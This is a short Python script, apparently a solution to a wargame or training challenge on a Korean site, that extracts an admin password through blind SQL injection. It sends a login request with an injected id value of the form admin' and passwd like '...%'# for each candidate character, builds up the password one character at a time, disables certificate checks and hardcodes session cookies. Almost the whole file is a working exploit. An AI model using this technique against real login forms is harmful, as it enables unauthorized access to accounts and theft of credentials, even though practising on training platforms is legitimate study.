import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def login(id, pw):
    url = "https://training.zairo.kr/challenge/c4f0f5b951b88d458cc15725500ad71a/index.html"

    headers = {
        "Cookie": "challenge13_session=16e226dae67c7f2ba54e5c58ebb70061; challenge8_session=3c08670ad015733f28722f207e465e71; session=.eJyrVkpMyc3MU7JKS8wpTtVRyslPT09NiQeJlBSVAgVKi1OL4jNTlKyUqhIzi_KVoCJ5ibmpQLGY0sQUA4OY0iTLxOSY0mRzSwOlWgC77hxC.YUU7Sg.bgGIFxGtx7QM3NgFIwOnDSaUWps; challenge14_session=7160229652cc2f19f7d868468c91b608"
    }

    proxy = {
        'http': 'http://127.0.0.1:8888',
        'https': 'http://127.0.0.1:8888'
    }

    data = {
        'id': id,
        'passwd': pw,
    }

    r = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
    return r.text





string_list = "abcdefghijklmnopqrstuvwxyz0123456789!@_"
password = ""

for i in range(20): # 패스워드가 20글자니깐 20번 반복
    for ch in string_list: # 문자 경우의 수 다 시도하기
        data = login("admin' and passwd like '{}{}%'#".format(password, ch), "a")
        if "admin" in data: # admin이 들어가 있으면 맞았어! 맞았을 때,
            password += ch
            print("[*] password is [{}]".format(password))
            break
